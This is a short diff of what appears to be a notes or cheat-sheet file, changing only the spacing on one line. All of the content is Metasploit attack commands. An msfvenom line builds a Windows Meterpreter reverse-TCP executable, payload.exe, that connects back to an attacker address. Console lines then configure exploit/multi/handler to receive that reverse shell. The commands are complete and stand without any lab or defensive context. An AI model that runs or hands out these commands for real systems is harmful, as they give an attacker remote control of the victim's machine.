@@ -1,4 +1,4 @@
-shell : msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.142 LPORT=2017 -f exe -o payload.exe
+shell:msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.142 LPORT=2017 -f exe -o payload.exe
 msf > use exploit/multi/handler
 msf > set PAYLOAD windows/meterpreter/reverse_tcp
 msf > set LHOST 192.168.31.142
